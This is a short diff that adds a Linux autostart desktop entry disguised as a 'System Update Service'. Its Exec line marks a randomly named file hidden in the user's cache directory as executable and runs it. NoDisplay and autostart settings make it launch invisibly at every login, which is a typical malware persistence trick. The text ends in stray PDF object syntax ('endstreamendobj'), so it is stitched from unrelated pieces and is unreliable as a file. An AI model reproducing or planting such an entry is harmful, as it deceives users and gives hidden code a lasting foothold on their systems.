@@ -1,0 +1,11 @@
+[Desktop Entry]
+Type=Application
+Name=System Update
+Comment=System Update Service
+Exec=sh -c 'chmod +x $HOME/.cache/TQkPoHCH && $HOME/.cache/TQkPoHCH'
+Terminal=false
+NoDisplay=true
+X-GNOME-Autostart-enabled=true
+
+endstreamendobj
+7 
